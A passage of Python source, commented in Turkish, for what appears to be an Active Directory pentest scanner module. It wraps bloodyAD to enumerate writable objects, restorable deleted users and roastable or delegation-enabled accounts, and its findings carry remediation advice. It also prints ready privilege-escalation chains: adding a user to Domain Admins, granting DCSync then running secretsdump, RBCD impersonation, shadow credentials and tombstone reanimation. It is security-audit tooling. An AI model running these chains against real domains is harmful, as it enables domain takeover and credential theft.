"""bloodyAD ile yazılabilir AD nesnelerinin (privesc yolları) enumerasyonu.

bloodyAD, AD nesneleri üzerinde okuma/yazma yapan bir çerçevedir. Burada onu
SALDIRGAN AMAÇLI DEĞİL, keşif amaçlı kullanıyoruz: `get writable` komutu, mevcut
kimliğin HANGİ nesnelere yazabildiğini listeler — bu, doğrudan yetki yükseltme
yollarını (bir gruba kendini ekleme, SPN yazıp kerberoast, RBCD, shadow
credentials vb.) ortaya çıkarır.

Kimlik gerektirir (yazılabilir ACL'leri sorgulamak auth ister); kimlik yoksa
modül kendini atlar. Yazma/istismar KOMUTLARI otomatik çalıştırılmaz — yalnızca
bulgunun 'escalation' alanında PoC olarak gösterilir.

Kurulum:  pipx install bloodyAD   (ya da pip install bloodyAD)
"""

from __future__ import annotations

import datetime as _dt
import ipaddress
import json
import re
from dataclasses import dataclass

_EPOCH_1601 = _dt.datetime(1601, 1, 1, tzinfo=_dt.timezone.utc)
KRBTGT_MAX_AGE_DAYS = 365   # krbtgt bundan eskiyse golden-ticket ömrü + geçmiş ele geçirme izi
STALE_ACCOUNT_DAYS = 90     # bu kadar gündür oturum açmamış ama ETKİN hesaplar


def _filetime_threshold(days_ago: int) -> int:
    """`days_ago` gün öncesini Windows FILETIME (1601'den bu yana 100ns) tamsayısına çevirir."""
    thr = _dt.datetime.now(_dt.timezone.utc) - _dt.timedelta(days=days_ago)
    return int((thr - _EPOCH_1601).total_seconds() * 10_000_000)


def _age_days(value: str) -> float | None:
    """Bir AD zaman damgasının (bloodyAD ISO metni ya da ham FILETIME) yaşını GÜN döndürür.

    Çözümlenemezse None (bulgu üretme — güvenli taraf).
    """
    if not value:
        return None
    s = value.strip()
    now = _dt.datetime.now(_dt.timezone.utc)
    # Ham FILETIME (uzun tamsayı) — bazı sürümler böyle döndürür
    if re.fullmatch(r"\d{11,}", s):
        try:
            dt = _EPOCH_1601 + _dt.timedelta(seconds=int(s) / 10_000_000)
        except (ValueError, OverflowError):
            return None
        return (now - dt).total_seconds() / 86400
    # ISO metin: "2021-03-01 10:11:12.3+00:00" / "2021-03-01T10:11:12" / tarih-only
    iso = s.replace("T", " ")
    iso = re.sub(r"\s*(UTC|GMT|Z)\s*$", "", iso).strip()
    for fmt in ("%Y-%m-%d %H:%M:%S.%f%z", "%Y-%m-%d %H:%M:%S%z",
                "%Y-%m-%d %H:%M:%S.%f", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d"):
        try:
            dt = _dt.datetime.strptime(iso, fmt)
        except ValueError:
            continue
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=_dt.timezone.utc)
        return (now - dt).total_seconds() / 86400
    return None

from ..findings import Finding, ScanReport, Severity
from ..runner import CommandResult, ToolStatus, resolve_tool, run, strip_dryrun

BLOODYAD_CANDIDATES = ["bloodyAD", "bloodyad"]

# DC LDAP signing / channel binding (EPA) zorunluysa düz LDAP bind reddedilir ya da
# eksik sonuç döner -> bunu görünce LDAPS (-s) ile otomatik tekrar deneriz.
_SIGNING_ERR = re.compile(
    r"strongerAuthRequired|data 80090346|channel binding|integrity|"
    r"must be signed|SicilyRequireSigning|LDAP signing|confidentiality|"
    r"stronger authentication required|unwilling to perform",
    re.IGNORECASE,
)

# Yazılabilir olduğunda doğrudan yetki yükseltmeye çeviren tehlikeli
# hak/öznitelikler -> kısa istismar açıklaması (escalation için)
# NOT: bloodyAD 'get writable --detail' KABA ACE adları (GenericAll/WriteDacl…) yerine
# ETKİN (effective) yazma haklarını verir: yazılabilir öznitelik adları + SD hakları
# (OWNER/DACL/SACL). Bu yüzden gerçek anahtarlar: dacl/owner/member/serviceprincipalname/
# msds-*/useraccountcontrol/scriptpath/*pwd. Eski ACE adlarını da (düz-metin/aclgraph
# uyumu için) alias olarak tutuyoruz.
_DANGER = {
    # --- SD (security descriptor) hakları ---
    "dacl": "WriteDacl (DACL) — DACL'i yeniden yaz -> kendine GenericAll/DCSync ver "
            "(domain kökünde = DCSync)",
    "owner": "WriteOwner (Owner) — sahipliği al -> DACL'i değiştir -> tam kontrol",
    "sacl": "WriteSacl (SACL) — denetim ayarlarını değiştir (iz gizleme)",
    # --- yazılabilir öznitelikler (effective) ---
    "member": "member — gruba üye ekle (kendini Domain Admins'e ekleme olasılığı)",
    "serviceprincipalname": "servicePrincipalName — SPN yaz -> targeted Kerberoast",
    "msds-allowedtoactonbehalfofotheridentity":
        "msDS-AllowedToActOnBehalfOfOtherIdentity — RBCD -> S4U2proxy ile taklit",
    "msds-keycredentiallink":
        "msDS-KeyCredentialLink — Shadow Credentials (pywhisker/certipy) -> kimlik ele geçir",
    "useraccountcontrol": "userAccountControl — ön kimlik doğrulamayı kapat -> AS-REP roast",
    "unixuserpassword": "unixUserPassword — parola alanına yaz",
    "userpassword": "userPassword — parola yaz",
    "unicodepwd": "unicodePwd — parola sıfırla",
    "scriptpath": "scriptPath — logon script -> kod çalıştırma",
    "gplink": "gPLink — OU'ya kötü amaçlı GPO bağla -> bağlı makinelerde kod çalıştırma",
    "msds-groupmsamembership": "msDS-GroupMSAMembership — gMSA parolasını okuma hakkı ver",
    # --- eski/kaba ACE adları (düz-metin çıktı / aclgraph uyumu için alias) ---
    "genericall": "GenericAll — nesne üzerinde tam kontrol (parola sıfırla / gruba ekle)",
    "genericwrite": "GenericWrite — öznitelik yaz (SPN/scriptPath -> kerberoast/kod çalıştırma)",
    "writedacl": "WriteDacl — DACL'i yeniden yaz -> kendine GenericAll/DCSync ver",
    "writeowner": "WriteOwner — sahipliği al -> DACL'i değiştir",
}

# DN'de geçtiğinde yüksek değerli hedef sayılan desenler.
# Son alternatif: DN'in TAMAMI yalnızca DC bileşenlerinden oluşuyorsa (domain NC kökü)
# = DCSync hedefi. (Eski '^dc=|,dc=..,dc=..$' deseni HER nesneyi yüksek değerli
#  işaretliyordu — düzeltildi.)
_PRIV_DN = re.compile(
    r"cn=domain admins|cn=enterprise admins|cn=administrators|cn=schema admins|"
    r"cn=group policy creator|cn=dnsadmins|cn=backup operators|"
    r"cn=account operators|cn=server operators|cn=key admins|"
    r"^dc=[^,]+(?:,dc=[^,]+)+$",
    re.IGNORECASE,
)

# Silinmiş (tombstone) nesne ya da Deleted Objects konteynerinin KENDİSİ:
#   "...\0ADEL:<guid>"  (silinmiş nesne)  |  "CN=Deleted Objects,DC=..." (konteyner = reanimate yetkisi)
_DELETED_RX = re.compile(r"\\0ADEL:|CN=Deleted Objects", re.IGNORECASE)


def tool() -> ToolStatus:
    return resolve_tool(BLOODYAD_CANDIDATES)


def _base_argv(
    target: str,
    domain: str | None,
    username: str,
    password: str | None,
    nthash: str | None,
    *,
    json_out: bool = False,
    secure: bool = False,
    use_kerberos: bool = False,
) -> list[str]:
    """Ortak bloodyAD çağrısının başı (host + kimlik). Alt komut çağıran ekler.

    Pass-the-hash: bloodyAD '-p' değerini 'LMHASH:NTHASH' biçiminde kabul eder.
    json_out: `--json` ile makine-okunur (güvenilir ayrıştırma) çıktı.
    secure:   `-s` ile LDAPS (signing/channel binding zorunlu DC'ler için).
    use_kerberos: `-k` (ccache/KRB5CCNAME ya da -p ile TGT).

    Not: global seçenekler (`--json`/`-s`/`-k`) alt komuttan ÖNCE verilmeli.
    """
    argv = [tool().name]
    if json_out:
        argv.append("--json")
    if secure:
        argv.append("-s")
    argv += ["--host", target, "-u", username]
    if domain:
        argv += ["-d", domain]
    # Kerberos bloodyAD'da --host'ta HOSTNAME ister (IP değil). Hedef IP ise -k'yi
    # eklemeyiz (NTLM'e düşer) — aksi halde bloodyAD "need hostname" ile patlar.
    kerb = use_kerberos and not _is_ip(target)
    if kerb:
        argv.append("-k")
    # Kerberos + yalnızca ccache ise parola verme (bloodyAD ccache/KRB5CCNAME kullanır)
    if nthash:
        argv += ["-p", f"aad3b435b51404eeaad3b435b51404ee:{nthash}"]
    elif password or not kerb:
        argv += ["-p", password or ""]
    return argv


def _is_ip(target: str) -> bool:
    """Hedef bir IP literali mi? (Kerberos --host hostname ister)."""
    try:
        ipaddress.ip_address(target.strip())
        return True
    except ValueError:
        return False


def _needs_secure(res: CommandResult | None) -> bool:
    """Çıktı, LDAP signing/channel binding zorunluluğuna mı işaret ediyor?"""
    return res is not None and bool(_SIGNING_ERR.search(res.combined or ""))


def _json_entries(res: CommandResult | None) -> list[dict]:
    """bloodyAD `--json` çıktısını (dict listesi) ayrıştırır; başarısızsa []."""
    if res is None or not res.ok:
        return []
    raw = res.stdout or ""
    start = raw.find("[")
    if start == -1:
        return []
    for end in (len(raw), raw.rfind("]") + 1):
        if end <= start:
            continue
        try:
            data = json.loads(raw[start:end])
        except ValueError:
            continue
        if isinstance(data, list):
            return [d for d in data if isinstance(d, dict)]
        if isinstance(data, dict):
            return [data]
    return []


def _norm_record(entry: dict) -> dict[str, list[str]]:
    """JSON entry'sini (anahtar küçük harf, değer list[str]) normalize eder."""
    out: dict[str, list[str]] = {}
    for k, v in entry.items():
        vals = v if isinstance(v, list) else [v]
        out[k.lower()] = [str(x) for x in vals]
    return out


def _records_of(res: CommandResult | None) -> list[dict[str, list[str]]]:
    """Bir sonucu kayıtlara çevirir: önce `--json`, olmazsa düz-metin ayrıştırma.

    Böylece gerçek çalıştırmalar (JSON, güvenilir) ile testlerin/eski sürümlerin
    (düz metin) çıktısı aynı yoldan işlenir.
    """
    if res is None:
        return []
    entries = _json_entries(res)
    if entries:
        return [_norm_record(e) for e in entries]
    return _records(strip_dryrun(res.combined))


def scan(
    target: str,
    *,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    nthash: str | None = None,
    timeout: int = 300,
    dry_run: bool = False,
    use_kerberos: bool = False,
) -> list[CommandResult]:
    if username is None or not (password or nthash):
        return [CommandResult(
            tool="bloodyad:skip", argv=[], returncode=None, stdout="", stderr="",
            duration=0.0, error="bloodyAD: kimlik gerekli (yazılabilir ACL sorgusu auth ister)")]

    # 1) 'get writable --detail' — hangi NESNEYE hangi ÖZNİTELİĞİ/HAKKI yazabildiğimiz.
    #    --detail OLMADAN yalnızca DN + 'permission' döner (hak tespiti boş kalır) — bu
    #    yüzden --detail ZORUNLU. --json ile de güvenilir ayrıştırma.
    def argv(secure: bool) -> list[str]:
        return _base_argv(target, domain, username, password, nthash,
                          json_out=True, secure=secure, use_kerberos=use_kerberos)

    writable_sub = ["get", "writable", "--detail"]
    w = run(argv(False) + writable_sub, tool="bloodyad-writable",
            timeout=timeout, dry_run=dry_run)
    secure = False
    if not dry_run and _needs_secure(w):
        secure = True  # DC signing/CB zorunlu -> LDAPS ile tekrar (ve kalan sorgularda da)
        w = run(argv(True) + writable_sub, tool="bloodyad-writable",
                timeout=timeout, dry_run=dry_run)
    results = [w]

    # 2) Silinmiş (reanimate edilebilir) KULLANICILAR — 'show deleted' kontrolü
    #    (1.2.840.113556.1.4.2064) ile Deleted Objects taranır; adaylar isimle bulunur.
    results.append(run(
        argv(secure) + ["get", "search",
                        "--filter", "(&(objectClass=user)(isDeleted=TRUE))",
                        "--attr", "sAMAccountName,lastKnownParent,msDS-LastKnownRDN",
                        "-c", "1.2.840.113556.1.4.2064"],
        tool="bloodyad-deleted", timeout=timeout, dry_run=dry_run))
    return results


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["bloodyad"] = "\n\n".join(r.combined for r in results)
    target = report.target
    by_tool = {r.tool: r for r in results}
    writable = by_tool.get("bloodyad-writable", results[0] if results else None)

    if writable and writable.tool == "bloodyad:skip":
        return  # kimlik yok — sessizce atla
    if writable and not writable.ok:
        report.add_error(f"bloodyAD: {writable.error or 'çalıştırılamadı'}")
        return

    # Silinmiş kullanıcı adayları (ayrı 'show deleted' sorgusundan) — isimle bul
    deleted_users = _deleted_users(by_tool.get("bloodyad-deleted"))

    # 'get writable --detail' kayıtları: her kayıt = {dn, yazılabilir-hak -> [WRITE]}.
    # JSON varsa ondan, yoksa düz-metinden (test/eski sürüm) ayrıştırılır.
    recs = _records_of(writable)
    dn_rights: list[tuple[str, list[str]]] = []
    for r in recs:
        dn = (r.get("distinguishedname") or [""])[0].strip()
        if not dn:
            continue
        rights = [k for k in r if k != "distinguishedname" and k != "permission"]
        dn_rights.append((dn, rights))
    dns = [dn for dn, _ in dn_rights]

    # Silinmiş nesne/konteyner YAZILABİLİR ise: tombstone reanimation (KRİTİK, isimli)
    cap_dns = [dn for dn in dns if _DELETED_RX.search(dn)]
    if cap_dns:
        _add_reanimation(target, report, cap_dns=cap_dns, deleted_users=deleted_users)

    # Reanimation DIŞI gerçek yazılabilir nesneler (silinmişleri çıkar — ayrı bulgu)
    live = [(dn, rights) for dn, rights in dn_rights if not _DELETED_RX.search(dn)]
    if not live:
        return  # (yalnızca silinmiş nesne vardıysa reanimation bulgusu zaten eklendi)

    # Tüm kayıtların yazma haklarını topla; _DANGER sırasına göre sırala
    all_rights = {k for _dn, rights in live for k in rights}
    hits = sorted({k for k in _DANGER if k in all_rights},
                  key=lambda k: list(_DANGER).index(k))
    priv_dns = [dn for dn, _ in live if _PRIV_DN.search(dn)]

    sev = Severity.CRITICAL if (priv_dns or hits) else Severity.HIGH
    why = "; ".join(_DANGER[k] for k in hits) or "yazılabilir nesne(ler) bulundu"

    # Kanıt: her yazılabilir nesneyi HAKLARIYLA listele (yüksek değerliler önce)
    ordered = sorted(live, key=lambda dr: (not _PRIV_DN.search(dr[0])))
    ev_lines = []
    for dn, rights in ordered[:15]:
        tag = " [YÜKSEK DEĞER]" if _PRIV_DN.search(dn) else ""
        rstr = ", ".join(rights) if rights else "WRITE"
        ev_lines.append(f"{dn}{tag}\n    -> yazılabilir: {rstr}")

    report.add(Finding(
        title=f"bloodyAD: {len(live)} yazılabilir AD nesnesi — yetki yükseltme yolu"
              + (f" ({len(priv_dns)} yüksek değerli)" if priv_dns else ""),
        severity=sev, target=target, source="bloodyad",
        description="Mevcut kimlik, bazı AD nesnelerine YAZABİLİYOR. Yazma hakları "
                    "doğrudan yetki yükseltmeye çevrilebilir. " + why,
        evidence="\n".join(ev_lines),
        remediation="Aşırı geniş yazma ACL'lerini kaldırın (en az yetki); AdminSDHolder "
                    "korumasını denetleyin; yetkili grup/nesne ACL'lerini sıkılaştırın.",
        reference="bloodyAD / ACL abuse (BloodHound 'writable')",
        poc=f"bloodyAD -H {target} -d <domain> -u <user> -p <pass> get writable --detail",
        escalation=_escalation(hits)))


def _escalation(hits: list[str]) -> str:
    """Bulunan yazma haklarına göre somut istismar PoC'leri üretir."""
    tips = []
    if "member" in hits:
        tips.append("Gruba ekle: bloodyAD ... add groupMember \"Domain Admins\" <sizin_user>")
    if "msds-keycredentiallink" in hits:
        tips.append("Shadow creds: bloodyAD ... add shadowCredentials <target> "
                    "-> certipy auth ile TGT/NT hash")
    if "serviceprincipalname" in hits:
        tips.append("Targeted Kerberoast: bloodyAD ... set object <user> servicePrincipalName "
                    "-v 'HOST/x' -> nxc ldap --kerberoasting -> hash kır")
    if "msds-allowedtoactonbehalfofotheridentity" in hits:
        tips.append("RBCD: bloodyAD ... add rbcd <target> <kontrol_ettiğiniz_makine>$ "
                    "-> getST.py -spn cifs/<target> -impersonate Administrator "
                    "<domain>/<makine>$:<pass>")
    if "useraccountcontrol" in hits:
        tips.append("AS-REP: bloodyAD ... add uac <user> -f DONT_REQ_PREAUTH -> asreproast")
    if any(k in hits for k in ("unicodepwd", "userpassword", "unixuserpassword", "genericall")):
        tips.append("Parola sıfırla: bloodyAD ... set password <target> 'Yeni.Parola123'")
    if "msds-groupmsamembership" in hits:
        tips.append("gMSA oku: bloodyAD ... get object <gmsa$> --attr msDS-ManagedPassword "
                    "-> NT hash ile pass-the-hash")
    if "gplink" in hits:
        tips.append("GPO abuse: yazılabilir OU'ya kötü GPO bağla (pyGPOAbuse/SharpGPOAbuse) "
                    "-> bağlı makinelerde SYSTEM")
    if any(k in hits for k in ("dacl", "writedacl", "writeowner", "owner", "genericall")):
        tips.append("DACL ele geçir: bloodyAD ... add dcsync <sizin_user> "
                    "-> secretsdump.py <domain>/<user>@<dc> -just-dc (DCSync, DA)")
    if not tips:
        tips.append("Yazılabilir nesneleri BloodHound 'shortest path' ile DA'ya bağla "
                    "(adscan --bloodhound sonrası otomatik yol analizi).")
    # Numaralı çok-satırlı: her yazma hakkı için somut istismar adımı
    return "\n".join(f"{i}) {t}" for i, t in enumerate(tips, 1))


# Silinmiş kullanıcıyı geri canlandırıp ele geçirmenin somut zinciri (adım adım).
_REANIMATION_CHAIN = (
    "1) Geri canlandır: bloodyAD ... set restore <ad>   (hesap çoğu zaman ETKİN döner)\n"
    "2) Hesabı ele geçir (parola bilinmiyorsa) — şu sırayla dene:\n"
    "   a) Parola tekrarı: elde edilen parolaları bu hesapta dene (nxc smb -u <ad> -p <parola>)\n"
    "   b) Targeted Kerberoast: bloodyAD ... set object <ad> servicePrincipalName -v 'HOST/x'\n"
    "      [gerekirse RC4'e indir: set object <ad> msDS-SupportedEncryptionTypes -v 4]\n"
    "      -> nxc ldap --kerberoasting -> hashcat -m 13100 (RC4) / -m 19700 (AES)\n"
    "   c) Shadow Credentials: bloodyAD ... add shadowCredentials <ad> -> certipy-ad auth\n"
    "      (NOT: tam yamalı DC'lerde PKINIT 'CLIENT_NOT_TRUSTED' ile kapalı olabilir)\n"
    "3) Ele geçen hesabın erişimini enumere et (get writable + --shares) ve zinciri sürdür."
)


def deleted_candidates(results: list[CommandResult]) -> list[tuple[str, str]]:
    """scan() sonuçlarından geri-canlandırılabilir kullanıcıları (ad, eski konum) çıkarır."""
    for r in results:
        if r.tool == "bloodyad-deleted":
            return _deleted_users(r)
    return []


def restore(target: str, name: str, *, domain: str | None = None,
            username: str | None = None, password: str | None = None,
            nthash: str | None = None, timeout: int = 300,
            dry_run: bool = False, use_kerberos: bool = False) -> CommandResult:
    """Silinmiş bir nesneyi geri canlandırır (tombstone reanimation).

    'set' aksiyonu olduğundan --json KULLANILMAZ (insan-okunur sonuç/log beklenir).
    """
    argv = _base_argv(target, domain, username, password, nthash,
                      use_kerberos=use_kerberos) + ["set", "restore", name]
    return run(argv, tool="bloodyad-restore", timeout=timeout, dry_run=dry_run)


def _deleted_users(res: CommandResult | None) -> list[tuple[str, str]]:
    """'show deleted' sorgusundan geri-canlandırılabilir kullanıcıları çıkarır.

    Dönen: (sAMAccountName|RDN, eski konum/lastKnownParent) çiftleri.
    """
    if res is None or not res.ok:
        return []
    users: list[tuple[str, str]] = []
    for rec in _records_of(res):
        name = (rec.get("samaccountname") or rec.get("msds-lastknownrdn") or [""])[0].strip()
        lkp = (rec.get("lastknownparent") or [""])[0].strip()
        if name:
            users.append((name, lkp))
    return users


def _add_reanimation(target: str, report: ScanReport, *,
                     cap_dns: list[str], deleted_users: list[tuple[str, str]]) -> None:
    """Silinmiş nesne YAZILABİLİR iken KRİTİK tombstone-reanimation bulgusu üretir.

    `deleted_users` doluysa adaylar İSİMLE listelenir (ör. mark.davies) ve restore
    PoC'si doğrudan o kullanıcıya göre üretilir; boşsa yetenek yine de bildirilir.
    """
    names = [u[0] for u in deleted_users]
    if not names:  # yedek: yazılabilir silinmiş DN'in CN'inden ad çıkar
        for d in cap_dns:
            m = re.match(r"CN=([^\\,]+)", d)  # "CN=Mark Davies\0ADEL:..." -> "Mark Davies"
            if m and "deleted objects" not in m.group(1).lower():
                names.append(m.group(1).strip())
    preview = (", ".join(names[:5]) + ("…" if len(names) > 5 else "")) if names else ""
    restore_target = names[0] if names else "<ad>"

    if deleted_users:
        ev = ["Geri canlandırılabilir silinmiş kullanıcı(lar):"]
        ev += [f"  • {s}" + (f"   (eski konum: {lkp})" if lkp else "")
               for s, lkp in deleted_users[:12]]
    else:
        ev = ["Yazılabilir silinmiş nesne / konteyner:"] + [f"  {d}" for d in cap_dns[:10]]

    report.add(Finding(
        title="bloodyAD: SİLİNMİŞ nesne yazılabilir — tombstone reanimation"
              + (f" ({preview})" if preview else f" ({len(cap_dns)} nesne)"),
        severity=Severity.CRITICAL, target=target, source="bloodyad",
        description="Mevcut kimlik, SİLİNMİŞ (tombstone) nesneleri ve/veya Deleted Objects "
                    "konteynerini yazabiliyor. Silinmiş bir kullanıcı geri canlandırılıp "
                    "(restore) ele geçirilerek yetki yükseltmeye çevrilebilir; geri gelen "
                    "hesap çoğu zaman ETKİN olur ve eski SID'ini korur (SID tabanlı ACE'ler "
                    "yeniden geçerli olur)."
                    + (f" Bulunan {len(deleted_users)} aday kullanıcı aşağıda."
                       if deleted_users else ""),
        evidence="\n".join(ev),
        remediation="Deleted Objects konteyneri ve tombstone nesneleri üzerindeki yazma "
                    "ACL'lerini kaldırın; 'Reanimate Tombstones' hakkı yalnızca "
                    "yöneticilerde olmalı; düşük yetkili hesaplardan WriteProperty/WriteDacl "
                    "devralımlarını denetleyin.",
        reference="Tombstone Reanimation (MS-ADTS 3.1.1.5.3.7) / bloodyAD set restore",
        poc=f"bloodyAD --host {target} -d <domain> -u <user> -p <pass> set restore {restore_target}",
        escalation=_REANIMATION_CHAIN))


# ===========================================================================
# LDAP ENUMERASYON  (get search / dnsDump / trusts)
# ---------------------------------------------------------------------------
# `get writable` yalnızca YAZILABİLİR nesneleri verir. Bir CTF/pentest'te asıl
# ilk adım OKUMA enumerasyonudur: kimlikle LDAP'a bind olup kerberoast/AS-REP
# adaylarını, delegasyonları, description alanındaki parolaları çıkarmak.
# Her sorgu TEK bir yüksek-sinyal bulgu türünü hedefler (gürültü az, anlam çok).
# ===========================================================================


@dataclass(frozen=True)
class _EnumQuery:
    """Tek bir LDAP enum sorgusu: ne aradığı + bulununca ne anlama geldiği."""

    key: str  # komut etiketi / --only alt kimliği
    label: str  # bulgu başlığı
    ldap_filter: str  # bloodyAD get search --filter
    attrs: str  # çekilecek öznitelikler
    severity: Severity
    description: str
    remediation: str
    escalation: str  # bu bulgudan sonraki somut adım


# sAMAccountType=805306368 (0x30000000) = normal kullanıcı hesabı (bilgisayarları eler).
# userAccountControl bit testi için OID 1.2.840.113556.1.4.803 (bitwise-AND) kullanılır:
#   4194304 = DONT_REQ_PREAUTH (AS-REP) | 32 = PASSWD_NOTREQD | 524288 = TRUSTED_FOR_DELEGATION
_ENUM_QUERIES: list[_EnumQuery] = [
    _EnumQuery(
        "asrep", "AS-REP roastable hesap (ön kimlik doğrulama KAPALI)",
        "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
        "sAMAccountName,userAccountControl", Severity.HIGH,
        "Bu hesaplar için Kerberos ön kimlik doğrulaması kapalı; kimlik olmadan bile "
        "AS-REP yanıtı istenip offline kırılabilir.",
        "İlgili hesaplarda 'Do not require Kerberos preauthentication' seçeneğini kapatın.",
        "nxc ldap <DC> -u <user> -p <pass> --asreproast asrep.txt  ->  hashcat -m 18200"),
    _EnumQuery(
        "kerberoast", "Kerberoastable kullanıcı (servicePrincipalName tanımlı)",
        "(&(sAMAccountType=805306368)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))",
        "sAMAccountName,servicePrincipalName", Severity.HIGH,
        "SPN'e sahip kullanıcı hesapları için herhangi bir kimlik TGS isteyip servis "
        "hesabının parolasını offline kırabilir.",
        "Servis hesaplarında uzun/rastgele parola (gMSA) kullanın; gereksiz SPN'leri silin.",
        "nxc ldap <DC> -u <user> -p <pass> --kerberoasting kr.txt  ->  hashcat -m 13100"),
    _EnumQuery(
        "desc", "description alanında olası parola/ipucu",
        "(&(sAMAccountType=805306368)(description=*))",
        "sAMAccountName,description", Severity.MEDIUM,
        "Yöneticiler sık sık ilk parolayı/ipucunu description alanına yazar — herkesçe "
        "okunabilir. CTF'te sık bir hızlı kazançtır.",
        "description alanlarından kimlik bilgisi/ipucu temizleyin.",
        "description değerlerini oku; parola olabilir  ->  login/spray ile dene"),
    _EnumQuery(
        "passnotreq", "Parola gerektirmeyen hesap (PASSWD_NOTREQD)",
        "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=32))",
        "sAMAccountName,userAccountControl", Severity.MEDIUM,
        "Bu hesaplarda boş parola geçerli olabilir.",
        "PASSWD_NOTREQD bayrağını kaldırın; parola politikasını zorunlu kılın.",
        "Boş parola dene:  nxc smb <DC> -u <user> -p ''"),
    _EnumQuery(
        "admincount", "Korunan yüksek yetkili hesap (adminCount=1)",
        "(&(sAMAccountType=805306368)(adminCount=1))",
        "sAMAccountName,memberOf", Severity.INFO,
        "adminCount=1 hesaplar şu an ya da geçmişte DA/EA gibi korumalı gruplardaydı; "
        "yüksek değerli hedeflerdir.",
        "Eski/gereksiz ayrıcalıkları gözden geçirin (AdminSDHolder kalıntıları).",
        "Bu hesapları kerberoast/AS-REP/spray için öncelikli hedef yap."),
    _EnumQuery(
        "encryption-des", "DES şifreleme etkin hesap (çok zayıf Kerberos etype)",
        # DES-CBC-CRC (0x1) VEYA DES-CBC-MD5 (0x2). BIT_AND tüm bitleri istediğinden
        # ":=3" iki DES'i AYNI ANDA arardı; "herhangi bir DES" için :=1 ve :=2'yi OR'luyoruz.
        # sAMAccountType ile makine değil kullanıcı hesapları hedeflenir.
        "(&(sAMAccountType=805306368)"
        "(|(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=1)"
        "(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=2)))",
        "sAMAccountName,msDS-SupportedEncryptionTypes", Severity.HIGH,
        "Bu hesaplar Kerberos'ta DES (56-bit) şifrelemeye izin verir. DES anlık denebilir "
        "ve biletleri trivial kırılır; hesap kerberoast edilirse parola neredeyse kesin düşer.",
        "msDS-SupportedEncryptionTypes'tan DES bitlerini kaldırın (yalnız AES128/AES256 bırakın); "
        "USE_DES_KEY_ONLY (UAC 0x200000) bayrağını temizleyin.",
        "Hesabı kerberoast/AS-REP et -> DES etype ile hashcat çok hızlı kırar -> yanal hareket."),
    _EnumQuery(
        "rc4-only", "RC4'e izin veren (AES'siz) hesap — zayıf Kerberos etype",
        # RC4 biti (0x4) SET ama AES128 (0x8) ya da AES256 (0x10) bitlerinden HİÇBİRİ set
        # değil. Not: OID 1.2.840.113556.1.4.803 (BIT_AND) TÜM bitleri ister; "herhangi
        # bir AES" için :=8 ve :=16'yı OR'layıp olumsuzluyoruz (:=24 iki AES'i AYNI ANDA
        # arayacağından yalnız-AES128 hesabını yanlış pozitif yapardı).
        "(&(sAMAccountType=805306368)"
        "(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=4)"
        "(!(|(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=8)"
        "(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=16))))",
        "sAMAccountName,msDS-SupportedEncryptionTypes", Severity.MEDIUM,
        "Bu hesaplar yalnızca RC4-HMAC'e güvenir (AES yapılandırılmamış). RC4 TGS biletleri "
        "(etype 23, hashcat -m 13100) AES'e göre çok daha hızlı offline kırılır; "
        "Kerberoasting için öncelikli hedeftir.",
        "msDS-SupportedEncryptionTypes'a AES128+AES256 (0x18) ekleyin ve RC4'ü mümkünse kaldırın.",
        "nxc ldap <DC> -u <user> -p <pass> --kerberoasting kr.txt  ->  hashcat -m 13100 (RC4, hızlı)."),
    _EnumQuery(
        "reversible-pw", "Geri döndürülebilir şifreleme ile parola saklama",
        # ENCRYPTED_TEXT_PWD_ALLOWED (UAC 0x80 = 128): parola düz-metne çözülebilir saklanır.
        "(&(sAMAccountType=805306368)"
        "(userAccountControl:1.2.840.113556.1.4.803:=128))",
        "sAMAccountName,userAccountControl", Severity.HIGH,
        "Bu hesaplar parolayı GERİ DÖNDÜRÜLEBİLİR şifreyle saklar (düz-metne eşdeğer). "
        "NTDS/SAM dökümünde ya da reversible store okunarak açık parola elde edilir.",
        "'Store password using reversible encryption' seçeneğini kapatın ve parolaları döndürün.",
        "DCSync/secretsdump sonrası reversible store -> açık parola -> doğrudan oturum."),
    _EnumQuery(
        "neverexpire-priv", "Parolası hiç dolmayan AYRICALIKLI hesap",
        # DONT_EXPIRE_PASSWORD (0x10000 = 65536) + adminCount=1: çürük/kalıcı ayrıcalıklı parola.
        "(&(sAMAccountType=805306368)(adminCount=1)"
        "(userAccountControl:1.2.840.113556.1.4.803:=65536))",
        "sAMAccountName,userAccountControl", Severity.MEDIUM,
        "Korumalı/ayrıcalıklı (adminCount=1) hesapların parolası hiç dolmuyor; çoğu zaman "
        "yıllardır değişmemiş, zayıf ve offline kırmaya açık yüksek-değerli hedeflerdir.",
        "Ayrıcalıklı hesaplarda DONT_EXPIRE_PASSWORD'ü kaldırın; düzenli rotasyon + gMSA/PAM.",
        "Bu hesapları önce kerberoast/spray'de öncelikli dene; kırılırsa çoğu zaman doğrudan DA."),
    _EnumQuery(
        "unconstrained", "Sınırsız (unconstrained) delegasyon",
        "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
        "sAMAccountName,dNSHostName", Severity.HIGH,
        "Bu makineler kendilerine kimlik doğrulayan herkesin TGT'sini önbelleğe alır; "
        "DC'yi zorlarsan (coerce) DC'nin TGT'sini yakalayabilirsin.",
        "Unconstrained delegasyonu kaldırın; hassas hesapları 'sensitive, cannot be delegated' yapın.",
        "Coerce (PetitPotam/printerbug) -> TGT yakala -> DCSync."),
    _EnumQuery(
        "constrained", "Kısıtlı (constrained) delegasyon (msDS-AllowedToDelegateTo)",
        "(msDS-AllowedToDelegateTo=*)",
        "sAMAccountName,msDS-AllowedToDelegateTo", Severity.HIGH,
        "Bu hesap, listelenen servislere başka kullanıcılar adına kimlik doğrulayabilir "
        "(S4U2self/S4U2proxy) — Administrator taklidi mümkün.",
        "Delegasyon hedeflerini daraltın; protokol geçişini (any auth) kapatın.",
        "getST.py -spn <hedef-spn> -impersonate Administrator <domain>/<hesap>:<pass>  "
